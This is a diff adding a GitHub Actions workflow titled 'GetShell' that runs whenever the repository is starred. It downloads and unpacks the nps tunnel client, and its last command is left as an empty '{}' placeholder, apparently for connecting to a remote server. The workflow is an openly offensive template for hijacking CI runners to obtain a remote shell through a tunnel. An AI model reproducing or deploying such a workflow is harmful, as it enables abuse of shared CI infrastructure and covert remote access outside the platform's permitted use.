@@ -1,0 +1,19 @@
+name: 'GetShell'
+ 
+on:
+  watch:
+    types: started
+jobs:
+  bot:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout
+      uses: actions/checkout@master
+    - name: EXECUTE
+
+      run: |
+            wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gz
+            tar -axvf linux_amd64_client.tar.gz
+            {}
